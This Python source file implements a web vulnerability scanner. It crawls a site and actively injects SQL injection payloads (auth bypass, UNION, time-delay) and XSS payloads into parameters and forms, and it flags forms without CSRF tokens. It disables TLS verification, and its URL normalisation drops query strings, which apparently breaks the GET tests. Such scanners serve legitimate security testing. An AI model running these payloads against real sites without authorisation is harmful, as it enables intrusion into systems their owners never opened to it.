"""
Web Security Scanner Engine — IMPROVED DETECTION
SQL Injection, XSS, CSRF detection with automated crawling
Specifically hardened for real-world vulnerability detection
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import time
import json
from typing import List, Dict, Set, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from dataclasses import dataclass, field, asdict

init(autoreset=True)


@dataclass
class Vulnerability:
    type: str
    url: str
    parameter: str
    payload: str
    severity: str
    description: str
    evidence: str = ""
    remediation: str = ""


@dataclass
class ScanResult:
    target_url: str
    scan_date: str
    total_urls_scanned: int
    total_forms_found: int
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    scan_duration_seconds: float = 0.0

    def to_dict(self) -> dict:
        return {
            "target_url": self.target_url,
            "scan_date": self.scan_date,
            "total_urls_scanned": self.total_urls_scanned,
            "total_forms_found": self.total_forms_found,
            "vulnerabilities": [asdict(v) for v in self.vulnerabilities],
            "scan_duration_seconds": self.scan_duration_seconds,
        }


class WebScanner:
    """Improved web security scanner with real-world detection."""

    # ===== SQL INJECTION ERROR PATTERNS (EXPANDED) =====
    SQL_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server",
        r"Unknown column.*in 'field list'",
        r"Duplicate entry.*for key",
        r"Table '.*?' doesn't exist",
        r"Column count doesn't match",
        r"#1",
        r"#1064",
        r"#1146",
        r"#1054",
        r"#1062",
        r"#1366",
        r"#2002",
        r"You have an error in your SQL syntax",
        # MariaDB specific
        r"MariaDB server version",
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"PG::SyntaxError",
        r"ERROR:\s+syntax error at or near",
        r"ERROR:\s+relation.*does not exist",
        r"ERROR:\s+column.*does not exist",
        r"ERROR:\s+function.*does not exist",
        # Oracle
        r"ORA-[0-9]{5}",
        r"Oracle.*Driver",
        r"Oracle.*error",
        r"Oracle.*ORA",
        r"PL/SQL.*error",
        # MSSQL
        r"Microsoft.*ODBC.*SQL Server",
        r"Driver.*SQL Server",
        r"SQL Server.*Driver",
        r"Unclosed quotation mark",
        r"Microsoft OLE DB.*SQL",
        r"Microsoft SQL Server.*error",
        r"Incorrect syntax near",
        r"Line \d+",
        r"Msg \d+, Level \d+",
        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"SQLite3::",
        r"Warning.*sqlite_",
        r"valid SQLite",
        r"not unique",
        r"UNIQUE constraint failed",
        # Generic
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"Syntax error in string in query",
        r"Divide by zero.*SQL",
        r"Uncaught.*QueryException",
        r"SQLSTATE\[",
        r"PDOException",
        r"mysql_fetch_",
        r"mysql_num_rows",
        r"mysql_error",
        r"mysqli_fetch_",
        r"mysqli_error",
        r"supplied argument is not a valid MySQL",
        r"Warning:.*\bdb2_\b",
        r"Warning:.*\boci_\b",
        r"Warning:.*\bodbc_\b",
        r"Warning:.*\bsqlsrv_\b",
        r"\[SQL Server\]",
        r"\[Oracle\]",
        r"\[MySQL\]",
        r"\[ODBC",
        r"\[Microsoft\]",
        r"\[IBM\]",
        r"SQL.+\berror\b",
        r"Error Occurred While Processing Request",
        r"Error Executing Database Query",
    ]

    # ===== SQL INJECTION PAYLOADS (HARDENED) =====
    SQLI_PAYLOADS = [
        # Basic
        "'",
        "\"",
        # Boolean-based
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1 -- -",
        "1' OR '1'='1",
        "1' AND 1=1 --",
        "' OR 1=1 --+",
        "' OR 1=1 LIMIT 1 --",
        "' OR '1'='1' LIMIT 1 --",
        # Admin bypass
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' OR '1'='1",
        "' OR 1=1 -- admin",
        # UNION based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT 1,2--",
        # String variations
        "' OR '1'='1",
        "' OR '1'='2",
        "' AND '1'='1",
        "' AND '1'='2",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"2",
        "\" AND \"1\"=\"1",
        "\" AND \"1\"=\"2",
        # Comment variations
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "1' OR 1=1 /*",
        "' OR 1=1 /*",
        # Time-based (sleep)
        "' OR SLEEP(5)--",
        "' OR SLEEP(5)#",
        "1' OR SLEEP(5)--",
        "' OR SLEEP(3) OR '1'='1",
        "1' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--",
        "1' OR pg_sleep(5)--",
        # Numeric
        "1 OR 1=1",
        "1 AND 1=1",
        "1 AND 1=2",
        # Double query injection
        "'+(select*from(select(sleep(5)))a)+'",
        "'+SLEEP(5)+'",
        # No quotes needed
        "OR 1=1",
        "OR 1=1--",
        "OR 1=1#",
        "|| 1=1",
        "|| 1=1--",
    ]

    # ===== XSS PAYLOADS (POLYGLOT & EVASION) =====
    XSS_PAYLOADS = [
        # Basic script
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        # Image onerror
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        # SVG
        "<svg onload=alert(1)>",
        "<svg onload=alert(1)//",
        # Body
        "<body onload=alert(1)>",
        # Input
        "<input onfocus=alert(1) autofocus>",
        # Detail/open
        "<details open ontoggle=alert(1)>",
        # Audio/video
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        # Iframe
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        # Event handlers
        "<div onmouseover=alert(1)>test</div>",
        "<div onclick=alert(1)>test</div>",
        # Encoded/obfuscated
        "<ScRiPt>alert(1)</ScRiPt>",
        "<sCrIpT>alert(1)</sCrIpT>",
        "<SCRIPT>alert(1)</SCRIPT>",
        # Broken syntax
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "';alert(1);//",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        # JavaScript URL
        "javascript:alert(1)",
        "\"onmouseover=\"alert(1)",
        # Attribute-based
        "\" autofocus onfocus=alert(1) x=\"",
        "' autofocus onfocus=alert(1) x='",
        # Without parentheses
        "<script>alert`1`</script>",
        "<script>confirm`1`</script>",
        "<script>prompt`1`</script>",
        # Nested
        "<img src=x onerror=\"<script>alert(1)</script>\">",
        # HTML entities (UTF-7/8 bypass attempts)
        "<img src=x onerror=\u0061lert(1)>",
        # Self-closing XSS
        "<script/src=data:,alert(1)></script>",
        "<script/src=data:;base13,alert(1)></script>",
        # Polyglot
        "\"'><img src=x onerror=alert(1)>",
        "\"'><svg onload=alert(1)>",
    ]

    def __init__(
        self,
        target_url: str,
        max_depth: int = 2,
        threads: int = 5,
        timeout: int = 15,
        user_agent: str = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
    ):
        self.target_url = target_url.rstrip("/")
        self.max_depth = max_depth
        self.threads = threads
        self.timeout = timeout
        self.visited_urls: Set[str] = set()
        self.forms_found: List[Dict] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        self.session.verify = False  # Allow self-signed certs in labs
        # Suppress SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        parsed = urlparse(target_url)
        self.target_domain = parsed.netloc
        self.target_scheme = parsed.scheme

        print(f"{Fore.CYAN}[*] Web Security Scanner initialized")
        print(f"{Fore.CYAN}[*] Target: {target_url}")
        print(f"{Fore.CYAN}[*] Max Depth: {max_depth} | Threads: {threads}")
        print(f"{Fore.CYAN}[*] Domain scope: {self.target_domain}\n")

    def _normalize_url(self, url: str) -> str:
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip("/")

    def _is_in_scope(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            # Also allow subdomains of the target
            return parsed.netloc == self.target_domain or parsed.netloc.endswith("." + self.target_domain) if "." in self.target_domain else parsed.netloc == self.target_domain
        except:
            return False

    def _extract_forms(self, url: str, html: str) -> List[Dict]:
        """Extract ALL forms including all input types."""
        forms = []
        soup = BeautifulSoup(html, "html.parser")

        for form in soup.find_all("form"):
            form_data = {
                "url": url,
                "method": form.get("method", "get").lower(),
                "action": form.get("action", ""),
                "inputs": [],
            }

            action = form.get("action", "")
            if action:
                form_data["action_url"] = urljoin(url, action)
            else:
                form_data["action_url"] = url

            # Extract ALL input fields including hidden
            for input_tag in form.find_all(["input", "textarea", "select", "button"]):
                input_type = input_tag.get("type", "text").lower()
                input_name = input_tag.get("name", "")

                if input_name:
                    form_data["inputs"].append({
                        "name": input_name,
                        "type": input_type,
                        "value": input_tag.get("value", ""),
                    })

            # If no named inputs found, try to find any input-like fields
            if not form_data["inputs"]:
                for input_tag in form.find_all("input"):
                    name = input_tag.get("name", "")
                    if name:
                        form_data["inputs"].append({
                            "name": name,
                            "type": input_tag.get("type", "text"),
                            "value": input_tag.get("value", ""),
                        })

            if form_data["inputs"]:
                forms.append(form_data)
            else:
                # Still add forms even without inputs (could be JS-handled)
                forms.append(form_data)

        return forms

    def _crawl_page(self, url: str, depth: int) -> List[str]:
        if depth > self.max_depth:
            return []

        normalized = self._normalize_url(url)
        if normalized in self.visited_urls:
            return []

        self.visited_urls.add(normalized)
        found_urls = []

        try:
            print(f"{Fore.BLUE}[*] Crawling: {url} (depth: {depth})")
            response = self.session.get(url, timeout=self.timeout)
            response.raise_for_status()

            content_type = response.headers.get("Content-Type", "")
            if "text" not in content_type and "html" not in content_type and "xml" not in content_type:
                if depth < self.max_depth:
                    pass  # Still try to parse links
                else:
                    return []

            html = response.text

            # Extract forms
            forms = self._extract_forms(url, html)
            self.forms_found.extend(forms)

            # Extract links
            soup = BeautifulSoup(html, "html.parser")
            for link in soup.find_all("a", href=True):
                href = link["href"].strip()
                full_url = urljoin(url, href)
                if full_url.startswith(("http://", "https://")):
                    if self._is_in_scope(full_url):
                        norm = self._normalize_url(full_url)
                        if norm not in self.visited_urls:
                            found_urls.append(full_url)

        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[!] Request failed for {url}: {str(e)[:80]}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error crawling {url}: {str(e)[:80]}")

        return found_urls

    def crawl(self) -> None:
        """Multi-threaded web crawler."""
        print(f"{Fore.CYAN}[*] Starting crawl on {self.target_url}")
        to_visit = [(self.target_url, 0)]
        start_time = time.time()

        while to_visit:
            batch = []
            depth = to_visit[0][1] if to_visit else 0

            while to_visit and to_visit[0][1] == depth:
                batch.append(to_visit.pop(0))
                if len(batch) >= self.threads * 2:
                    break

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self._crawl_page, url, d): (url, d)
                    for url, d in batch
                }
                for future in as_completed(futures):
                    try:
                        new_urls = future.result()
                        for new_url in new_urls:
                            to_visit.append((new_url, depth + 1))
                    except Exception:
                        pass

        elapsed = time.time() - start_time
        print(f"\n{Fore.GREEN}[✓] Crawl complete!")
        print(f"{Fore.GREEN}[✓] URLs scanned: {len(self.visited_urls)}")
        print(f"{Fore.GREEN}[✓] Forms found: {len(self.forms_found)}")
        print(f"{Fore.GREEN}[✓] Time: {elapsed:.2f}s\n")

    # ==================== SQL INJECTION DETECTION ====================

    def _check_sql_error(self, response_text: str) -> Tuple[bool, str]:
        """Check if response contains SQL error signatures."""
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, match.group()
        return False, ""

    def _test_bool_based_sqli(self, url: str, param: str) -> List[Vulnerability]:
        """
        Test for boolean-based blind SQLi by comparing response sizes
        between true and false conditions.
        """
        found = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if param not in params:
            return []

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        original_value = params[param][0]

        # Get baseline response
        try:
            baseline_resp = self.session.get(
                base_url + "?" + urlencode(params, doseq=True),
                timeout=self.timeout
            )
            baseline_len = len(baseline_resp.text)
        except:
            return []

        # Test pairs: true vs false
        test_pairs = [
            ("' OR '1'='1", "' OR '1'='2"),
            ("' AND 1=1 --", "' AND 1=2 --"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
            ("1 AND 1=1", "1 AND 1=2"),
        ]

        for true_payload, false_payload in test_pairs:
            try:
                # True condition
                true_params = params.copy()
                true_params[param] = [true_payload]
                true_resp = self.session.get(
                    base_url + "?" + urlencode(true_params, doseq=True),
                    timeout=self.timeout
                )
                true_len = len(true_resp.text)

                # False condition
                false_params = params.copy()
                false_params[param] = [false_payload]
                false_resp = self.session.get(
                    base_url + "?" + urlencode(false_params, doseq=True),
                    timeout=self.timeout
                )
                false_len = len(false_resp.text)

                # Check if they differ significantly (indicating boolean-based SQLi)
                # Also check if baseline is similar to true condition
                diff = abs(true_len - false_len)
                baseline_diff_true = abs(true_len - baseline_len)
                baseline_diff_false = abs(false_len - baseline_len)

                # If true and false responses differ by more than 20 chars,
                # AND baseline matches the true response, it's likely boolean-based SQLi
                if diff > 20 and baseline_diff_true < diff:
                    vuln = Vulnerability(
                        type="SQL Injection (Boolean-based Blind)",
                        url=url,
                        parameter=param,
                        payload=true_payload,
                        severity="Critical",
                        description=f"Boolean-based blind SQL Injection in parameter '{param}' — "
                                    f"true/false conditions produce different responses",
                        evidence=f"True response length: {true_len}, "
                                 f"False response length: {false_len}, "
                                 f"Baseline length: {baseline_len}",
                        remediation="Use parameterized queries. Input validation. "
                                    "Consistent error handling regardless of query result.",
                    )
                    found.append(vuln)
                    print(f"{Fore.RED}[!] Boolean SQLi FOUND: {url} | param: {param}")
                    break

            except Exception:
                continue

        return found

    def _test_time_based_sqli(self, url: str, param: str) -> List[Vulnerability]:
        """
        Test for time-based blind SQLi by measuring response delays.
        """
        found = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if param not in params:
            return []

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Time-based payloads
        time_payloads = [
            ("' OR SLEEP(5)--", 5, "MySQL"),
            ("' OR SLEEP(5)#", 5, "MySQL"),
            ("1' OR SLEEP(5)--", 5, "MySQL"),
            ("1' AND SLEEP(5)--", 5, "MySQL"),
            ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
            ("'; WAITFOR DELAY '00:00:05'--", 5, "MSSQL"),
            ("1'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
            ("' OR pg_sleep(5)--", 5, "PostgreSQL"),
            ("1' OR pg_sleep(5)--", 5, "PostgreSQL"),
            ("' OR pg_sleep(5)::text--", 5, "PostgreSQL"),
        ]

        # Get baseline timing
        try:
            baseline_params = params.copy()
            baseline_params[param] = [params[param][0]]
            start = time.time()
            self.session.get(
                base_url + "?" + urlencode(baseline_params, doseq=True),
                timeout=self.timeout + 5
            )
            baseline_time = time.time() - start
        except:
            baseline_time = 0.5

        print(f"{Fore.CYAN}   [*] Baseline response time: {baseline_time:.2f}s")

        for payload, sleep_seconds, db_type in time_payloads:
            try:
                test_params = params.copy()
                test_params[param] = [payload]

                start = time.time()
                self.session.get(
                    base_url + "?" + urlencode(test_params, doseq=True),
                    timeout=self.timeout + sleep_seconds + 5
                )
                elapsed = time.time() - start

                # If response took significantly longer than baseline
                if elapsed >= baseline_time + sleep_seconds * 0.8:
                    vuln = Vulnerability(
                        type=f"SQL Injection (Time-based Blind - {db_type})",
                        url=url,
                        parameter=param,
                        payload=payload,
                        severity="Critical",
                        description=f"Time-based blind SQL Injection detected in parameter '{param}' "
                                    f"({db_type} syntax)",
                        evidence=f"Response time: {elapsed:.2f}s (baseline: {baseline_time:.2f}s). "
                                 f"Payload caused {sleep_seconds}s delay.",
                        remediation="Use parameterized queries. Implement query timeouts. "
                                    "Avoid dynamic SQL generation.",
                    )
                    found.append(vuln)
                    print(f"{Fore.RED}[!] Time-based SQLi FOUND: {url} | param: {param} | "
                          f"{db_type} | delay: {elapsed:.2f}s")
                    break

            except requests.exceptions.Timeout:
                # Timeout = likely successful time-based injection
                vuln = Vulnerability(
                    type=f"SQL Injection (Time-based Blind - {db_type})",
                    url=url,
                    parameter=param,
                    payload=payload,
                    severity="Critical",
                    description=f"Time-based blind SQL Injection detected — request timed out "
                                f"after {self.timeout + sleep_seconds + 5}s",
                    evidence=f"Request timed out. Payload: {payload}",
                    remediation="Use parameterized queries. Implement query timeouts.",
                )
                found.append(vuln)
                print(f"{Fore.RED}[!] Time-based SQLi FOUND (timeout): {url} | param: {param}")
                break
            except Exception:
                continue

        return found

    def _test_error_based_sqli(self, url: str, param: str) -> List[Vulnerability]:
        """Test for error-based SQL injection."""
        found = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if param not in params:
            return []

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in self.SQLI_PAYLOADS:
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = base_url + "?" + urlencode(test_params, doseq=True)

                response = self.session.get(test_url, timeout=self.timeout)
                is_error, evidence = self._check_sql_error(response.text)

                if is_error:
                    vuln = Vulnerability(
                        type="SQL Injection (Error-based)",
                        url=url,
                        parameter=param,
                        payload=payload[:80],
                        severity="Critical",
                        description=f"Error-based SQL Injection detected in parameter '{param}'",
                        evidence=f"SQL Error: {evidence[:300]}",
                        remediation="Use parameterized queries / prepared statements. "
                                    "Hide database error details from users.",
                    )
                    found.append(vuln)
                    print(f"{Fore.RED}[!] Error SQLi FOUND: {url} | param: {param} | "
                          f"payload: {payload[:50]}")
                    break  # One finding per parameter is sufficient

            except Exception:
                continue

        return found

    def _test_sqli_get(self, url: str, param: str) -> List[Vulnerability]:
        """Comprehensive SQLi test on a GET parameter (all techniques)."""
        found = []

        # 1. Error-based
        found.extend(self._test_error_based_sqli(url, param))
        if found:
            return found

        # 2. Boolean-based blind
        found.extend(self._test_bool_based_sqli(url, param))
        if found:
            return found

        # 3. Time-based blind
        found.extend(self._test_time_based_sqli(url, param))

        return found

    def _test_sqli_post(self, form: Dict) -> List[Vulnerability]:
        """Test a form for SQL injection."""
        found = []

        for input_field in form["inputs"]:
            param = input_field["name"]

            for payload in self.SQLI_PAYLOADS[:20]:  # Test top 20 payloads on forms
                try:
                    form_data = {}
                    for inp in form["inputs"]:
                        if inp["name"] == param:
                            form_data[param] = payload
                        else:
                            form_data[inp["name"]] = inp.get("value", "test")

                    if form["method"] == "post":
                        response = self.session.post(
                            form["action_url"], data=form_data, timeout=self.timeout
                        )
                    else:
                        response = self.session.get(
                            form["action_url"], params=form_data, timeout=self.timeout
                        )

                    is_error, evidence = self._check_sql_error(response.text)
                    if is_error:
                        vuln = Vulnerability(
                            type="SQL Injection (Error-based)",
                            url=form["url"],
                            parameter=param,
                            payload=payload[:80],
                            severity="Critical",
                            description=f"Error-based SQL Injection in form field '{param}' (POST)",
                            evidence=f"SQL Error: {evidence[:300]}",
                            remediation="Use parameterized queries. Validate all form inputs.",
                        )
                        found.append(vuln)
                        print(f"{Fore.RED}[!] SQLi FOUND (POST): {form['url']} | field: {param}")
                        break

                except Exception:
                    continue

        return found

    # ==================== XSS DETECTION ====================

    def _test_xss_get(self, url: str, param: str) -> List[Vulnerability]:
        """Test a GET parameter for reflected XSS — improved detection."""
        found = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if param not in params:
            return []

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in self.XSS_PAYLOADS:
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = base_url + "?" + urlencode(test_params, doseq=True)

                response = self.session.get(test_url, timeout=self.timeout)
                resp_text = response.text

                # Check reflection with multiple strategies
                reflected = False
                evidence = ""

                # Strategy 1: Exact payload match
                if payload in resp_text:
                    reflected = True
                    evidence = f"Payload exactly reflected: {payload[:100]}"

                # Strategy 2: Case-insensitive match (for script tags)
                elif payload.lower() in resp_text.lower():
                    reflected = True
                    evidence = f"Payload reflected (case-insensitive match): {payload[:100]}"

                # Strategy 3: Check for key XSS signatures
                # e.g., if we injected `<script>` check for any `<script` in response
                else:
                    # Extract key patterns from payload
                    xss_keywords = ["<script", "onerror=", "onload=", "onfocus=",
                                    "onclick=", "onmouseover=", "ontoggle=",
                                    "javascript:", "alert(", "srcdoc=", "autofocus"]
                    for keyword in xss_keywords:
                        if keyword in payload and keyword.lower() in resp_text.lower():
                            reflected = True
                            evidence = f"XSS signature '{keyword}' reflected in response"
                            break

                if reflected:
                    # Make sure it's not HTML-encoded (i.e., actually executable)
                    # Check for dangerous encoding
                    dangerous_encoded = [
                        payload.replace("<", "&lt;"),
                        payload.replace(">", "&gt;"),
                    ]

                    is_encoded = all(enc in resp_text for enc in dangerous_encoded if enc != payload)

                    if not is_encoded:
                        vuln = Vulnerability(
                            type="XSS (Reflected)",
                            url=url,
                            parameter=param,
                            payload=payload[:100],
                            severity="High",
                            description=f"Reflected XSS detected in parameter '{param}'",
                            evidence=evidence,
                            remediation="Contextual output encoding. Content-Security-Policy headers. "
                                        "Input validation with whitelist approach.",
                        )
                        found.append(vuln)
                        print(f"{Fore.RED}[!] XSS FOUND: {url} | param: {param} | "
                              f"payload: {payload[:50]}")
                        break  # One finding per parameter

            except Exception:
                continue

        return found

    def _test_xss_post(self, form: Dict) -> List[Vulnerability]:
        """Test a form for XSS."""
        found = []

        for input_field in form["inputs"]:
            param = input_field["name"]

            for payload in self.XSS_PAYLOADS[:15]:
                try:
                    form_data = {}
                    for inp in form["inputs"]:
                        if inp["name"] == param:
                            form_data[param] = payload
                        else:
                            form_data[inp["name"]] = inp.get("value", "test")

                    if form["method"] == "post":
                        response = self.session.post(
                            form["action_url"], data=form_data, timeout=self.timeout
                        )
                    else:
                        response = self.session.get(
                            form["action_url"], params=form_data, timeout=self.timeout
                        )

                    resp_text = response.text

                    if payload in resp_text or payload.lower() in resp_text.lower():
                        vuln = Vulnerability(
                            type="XSS (Reflected)",
                            url=form["url"],
                            parameter=param,
                            payload=payload[:100],
                            severity="High",
                            description=f"Reflected XSS in form field '{param}' (POST)",
                            evidence=f"Payload reflected in response",
                            remediation="Contextual output encoding. Server-side validation. CSP headers.",
                        )
                        found.append(vuln)
                        print(f"{Fore.RED}[!] XSS FOUND (POST): {form['url']} | field: {param}")
                        break

                except Exception:
                    continue

        return found

    # ==================== CSRF DETECTION ====================

    def _test_csrf(self, form: Dict) -> List[Vulnerability]:
        """Detect potential CSRF vulnerabilities."""
        found = []

        if form["method"] not in ("post", "put", "delete"):
            return []

        has_csrf_token = False
        csrf_patterns = [
            "csrf", "csrf_token", "csrftoken", "csrfmiddlewaretoken",
            "_csrf", "csrf-token", "__csrf", "xsrf", "_xsrf",
            "authenticity_token", "_token", "token", "nonce",
            "_request_verification_token", "__RequestVerificationToken",
            "secret", "_secret",
        ]

        for inp in form["inputs"]:
            name_lower = inp["name"].lower()
            if any(pattern in name_lower for pattern in csrf_patterns):
                has_csrf_token = True
                break

        if not has_csrf_token:
            vuln = Vulnerability(
                type="CSRF (Potential)",
                url=form["url"],
                parameter="N/A (form-level)",
                payload="Cross-Site Request Forgery",
                severity="Medium",
                description=f"Potential CSRF vulnerability — no CSRF token in "
                            f"{form['method'].upper()} form",
                evidence=f"Form action: {form['action_url']}, "
                         f"Inputs: {len(form['inputs'])}",
                remediation="Implement CSRF tokens. Use SameSite cookies. "
                            "Validate Origin/Referer headers.",
            )
            found.append(vuln)
            print(f"{Fore.YELLOW}[!] CSRF (Potential): {form['url']} | "
                  f"{form['method'].upper()} form lacks CSRF token")

        return found

    # ==================== MAIN SCAN ====================

    def scan(self) -> ScanResult:
        """Execute full scan: crawl → SQLi → XSS → CSRF."""
        import datetime

        start_time = time.time()
        scan_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}  Web Security Scanner — Full Scan")
        print(f"{Fore.CYAN}  Target: {self.target_url}")
        print(f"{Fore.CYAN}  Started: {scan_date}")
        print(f"{'='*60}\n")

        # Phase 1: Crawl
        print(f"{Fore.MAGENTA}[+] Phase 1/4: Automated Crawling{'─'*30}")
        self.crawl()

        # Phase 2: SQL Injection
        print(f"{Fore.MAGENTA}[+] Phase 2/4: SQL Injection Detection{'─'*27}")
        sqli_count = 0

        for url in list(self.visited_urls):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in ("utm_source", "utm_medium", "utm_campaign", "ref", "source"):
                    continue  # Skip tracking parameters
                results = self._test_sqli_get(url, param)
                self.vulnerabilities.extend(results)
                sqli_count += len(results)

        for form in self.forms_found:
            results = self._test_sqli_post(form)
            self.vulnerabilities.extend(results)
            sqli_count += len(results)

        print(f"{Fore.GREEN if sqli_count == 0 else Fore.RED}"
              f"[✓] SQL Injection checks: {sqli_count} found\n")

        # Phase 3: XSS
        print(f"{Fore.MAGENTA}[+] Phase 3/4: XSS Detection{'─'*35}")

        xss_count = 0
        for url in list(self.visited_urls):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in ("utm_source", "utm_medium", "utm_campaign", "ref", "source"):
                    continue
                results = self._test_xss_get(url, param)
                self.vulnerabilities.extend(results)
                xss_count += len(results)

        for form in self.forms_found:
            results = self._test_xss_post(form)
            self.vulnerabilities.extend(results)
            xss_count += len(results)

        print(f"{Fore.GREEN if xss_count == 0 else Fore.RED}"
              f"[✓] XSS checks: {xss_count} found\n")

        # Phase 4: CSRF
        print(f"{Fore.MAGENTA}[+] Phase 4/4: CSRF Testing{'─'*36}")
        csrf_count = 0
        for form in self.forms_found:
            results = self._test_csrf(form)
            self.vulnerabilities.extend(results)
            csrf_count += len(results)

        print(f"{Fore.GREEN if csrf_count == 0 else Fore.YELLOW}"
              f"[✓] CSRF checks: {csrf_count} potential issues\n")

        # Summary
        elapsed = time.time() - start_time
        print(f"{'='*60}")
        print(f"{Fore.CYAN}  SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"  Target:              {self.target_url}")
        print(f"  URLs crawled:        {len(self.visited_urls)}")
        print(f"  Forms analyzed:       {len(self.forms_found)}")
        print(f"  Total vulnerabilities: {len(self.vulnerabilities)}")
        print(f"    ├─ SQL Injection:   {sqli_count}")
        print(f"    ├─ XSS:             {xss_count}")
        print(f"    └─ CSRF:            {csrf_count}")
        print(f"  Duration:            {elapsed:.2f}s")
        print(f"{'='*60}\n")

        result = ScanResult(
            target_url=self.target_url,
            scan_date=scan_date,
            total_urls_scanned=len(self.visited_urls),
            total_forms_found=len(self.forms_found),
            vulnerabilities=self.vulnerabilities,
            scan_duration_seconds=elapsed,
        )

        return result
